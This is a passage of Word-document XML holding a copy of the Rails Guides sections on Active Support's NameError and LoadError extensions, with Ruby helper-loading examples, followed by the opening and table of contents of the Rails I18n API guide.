        <w:t>The name may be given as a symbol or string. A symbol is tested against the bare constant name, a string is against the fully-qualified constant name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B6311F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A symbol can represent a fully-qualified constant name as in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:"ActiveRecord::Base"</w:t>
      </w:r>
      <w:r>
        <w:t>, so the behavior for symbols is defined for convenience, not because it has to be that way technically.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29873300" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For example, when an action of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>PostsController</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is called Rails tries optimistically to use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>PostsHelper</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. It is OK that the helper module does not exist, so if an exception for that constant name is raised it should be silenced. But it could be the case that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>posts_helper.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> raises a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>NameError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> due to an actual unknown constant. That should be reraised. The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>missing_name?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> provides a way to distinguish both cases:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6695"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4B9CC44E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="42BC5E71" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>default_helper_module!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F7FEDEA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module_name = name.sub(/Controller$/, '')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79D7142E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module_path = module_name.underscore</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B2E114F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  helper module_path</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="415AF36B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rescue</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>MissingSourceFile =&gt; e</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5939230A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  raise</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>e unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>e.is_missing? "#{module_path}_helper"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0002284E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rescue</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>NameError =&gt; e</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DD0DA80" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  raise</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>e unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>e.missing_name? "#{module_name}Helper"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="005B5A1D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5823BFE6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/name_error.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E85C16E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">21 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>LoadError</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C5A81DD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support adds </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>is_missing?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>LoadError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and also assigns that class to the constant </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>MissingSourceFile</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for backwards compatibility.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5734BA26" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Given a path name </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>is_missing?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tests whether the exception was raised due to that particular file (except perhaps for the “.rb” extension).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD62CDB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For example, when an action of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>PostsController</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is called Rails tries to load </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>posts_helper.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, but that file may not exist. That’s fine, the helper module is not mandatory so Rails silences a load error. But it could be the case that the helper module does exist and in turn requires another library that is missing. In that case Rails must reraise the exception. The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>is_missing?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> provides a way to distinguish both cases:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7535"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="105E7656" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5F839A5C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>default_helper_module!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56C59C3A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module_name = name.sub(/Controller$/, '')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="760750FB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module_path = module_name.underscore</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11BAAD50" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  helper module_path</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4197A0EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rescue</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>MissingSourceFile =&gt; e</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71051C74" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  raise</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>e unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>e.is_missing? "helpers/#{module_path}_helper"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C217A1C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rescue</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>NameError =&gt; e</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B567AA2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  raise</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>e unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>e.missing_name? "#{module_name}Helper"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FAB7970" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="12EE8102" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/load_error.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62D7F34E" w14:textId="7A8E9DB2" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5.2、</w:t>
      </w:r>
      <w:hyperlink r:id="rId494" w:history="1">
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Rails Internationalization </w:t>
        </w:r>
        <w:r w:rsidR="009A002D" w:rsidRPr="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>(I18n)</w:t>
        </w:r>
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>API</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="119DDF6A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The Ruby I18n (shorthand for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>internationalization</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) gem which is shipped with Ruby on Rails (starting from Rails 2.2) provides an easy-to-use and extensible framework for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>translating your application to a single custom language</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> other than English or for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>providing multi-language support</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in your application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7090A472" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The process of “internationalization” usually means to abstract all strings and other locale specific bits (such as date or currency formats) out of your application. The process of “localization” means to provide translations and localized formats for these bits. </w:t>
      </w:r>
      <w:hyperlink r:id="rId495" w:anchor="fn1" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
            <w:vertAlign w:val="superscript"/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7801996E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">So, in the process of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>internationalizing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> your Rails application you have to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70680014" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="291"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Ensure you have support for i18n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D7E77D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="291"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Tell Rails where to find locale dictionaries</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D899B9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="291"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Tell Rails how to set, preserve and switch locales</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718E3CF3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the process of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>localizing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> your application you’ll probably want to do the following three things:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C521F2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="292"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Replace or supplement Rails’ default locale — e.g. date and time formats, month names, Active Record model names, etc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB441DE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="292"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Abstract strings in your application into keyed dictionaries — e.g. flash messages, static text in your views, etc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="474FAC5A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="292"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Store the resulting dictionaries somewhere</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5693D634" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This guide will walk you through the I18n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and contains a tutorial on how to internationalize a Rails application from the start.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008D7D1C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F054415" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId496" w:anchor="1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>How I18n in Ruby on Rails Works</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1811BA37" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId497" w:anchor="1-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>The Overall Architecture of the Library</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7B219416" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId498" w:anchor="1-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">The Public I18n </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>API</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="523B1477" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId499" w:anchor="2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Setup the Rails Application for Internationalization</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3F8CF877" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId500" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Configure the I18n Module</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1E24C1E7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId501" w:anchor="2-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Optional: Custom I18n Configuration Setup</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="032F7823" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId502" w:anchor="2-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Setting and Passing the Locale</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
